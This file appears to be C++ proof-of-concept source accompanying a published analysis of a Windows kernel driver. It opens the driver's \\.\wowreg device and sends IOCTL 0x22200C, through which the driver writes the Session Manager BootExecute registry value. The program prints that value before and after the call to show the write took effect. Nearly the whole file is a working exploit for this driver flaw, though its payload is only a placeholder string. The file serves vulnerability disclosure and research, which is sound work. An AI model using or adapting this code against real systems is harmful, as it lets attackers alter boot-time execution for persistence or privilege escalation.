
// https://zeifan.my/Ampa-Driver-Analysis/
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <vector>

// 0x22200C
#ifndef IOCTL_WOWREG_SET_BOOTEXECUTE
#define IOCTL_WOWREG_SET_BOOTEXECUTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS) 
#endif

static const wchar_t* kSessionMgrKey = L"SYSTEM\\CurrentControlSet\\Control\\Session Manager";
static const wchar_t* kBootExecute = L"BootExecute";

static bool ParseRegistry(std::vector<std::wstring>& entries) 
{
    entries.clear();

    HKEY hKey = nullptr;
    LSTATUS st = RegOpenKeyExW(HKEY_LOCAL_MACHINE, kSessionMgrKey, 0, KEY_QUERY_VALUE, &hKey);
    if (st != ERROR_SUCCESS) 
    {
        wprintf(L"[-] Check your permission. Maybe you need Admin?\n");
        return false;
    }

    DWORD type = 0;
    DWORD cb = 0;
    st = RegQueryValueExW(hKey, kBootExecute, nullptr, &type, nullptr, &cb);
    if (st != ERROR_SUCCESS) 
    {
        wprintf(L"[-] Unable to query registry value\n");
        RegCloseKey(hKey);
        return false;
    }
    if (type != REG_MULTI_SZ || cb == 0)
    {
        RegCloseKey(hKey);
        return false;
    }

    std::wstring buffer;
    buffer.resize(cb / sizeof(wchar_t));
    st = RegQueryValueExW(hKey, kBootExecute, nullptr, &type, reinterpret_cast<LPBYTE>(&buffer[0]), &cb);
    RegCloseKey(hKey);
    if (st != ERROR_SUCCESS) 
    {
        return false;
    }

    const wchar_t* p = buffer.c_str();
    while (*p)
    {
        size_t len = wcslen(p);
        entries.emplace_back(p, p + len);
        p += len + 1;
    }
    
    return true;
}

static void ReadRegistry(const wchar_t* tag) 
{
    std::vector<std::wstring> entries;

    if (ParseRegistry(entries)) 
    {
        wprintf(L"\n[+] BootExecute registry entry:\n");
        
        for (size_t i = 0; i < entries.size(); ++i) 
        {
            wprintf(L"  [%zu] %s\n", i, entries[i].c_str());
        }
    }
    else 
    {
        wprintf(L"[-] Unable to read registry entry of BootExecute\n", tag);
    }
}

int wmain() 
{
    ReadRegistry(L"Registry Before");

    HANDLE h = CreateFileW(L"\\\\.\\wowreg", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) 
    {
        wprintf(L"[-] Unable to open device handle\n");
        return 1;
    }

    DWORD bytesReturned = 0;
    const wchar_t dummy[] = L"test";

    wprintf(L"\nSending IOCTL 0x%08X to set BootExecute...\n", IOCTL_WOWREG_SET_BOOTEXECUTE);
    
    BOOL ok = DeviceIoControl(h, IOCTL_WOWREG_SET_BOOTEXECUTE, (LPVOID)dummy, sizeof(dummy), nullptr, 0, &bytesReturned, nullptr);
    if (!ok) 
    {
        wprintf(L"[-] Unable to call IOCTL. Please check for permission access to the device.\n");
        CloseHandle(h);
        return 2;
    }
    
    CloseHandle(h);

    ReadRegistry(L"Registry After");
    return 0;
}
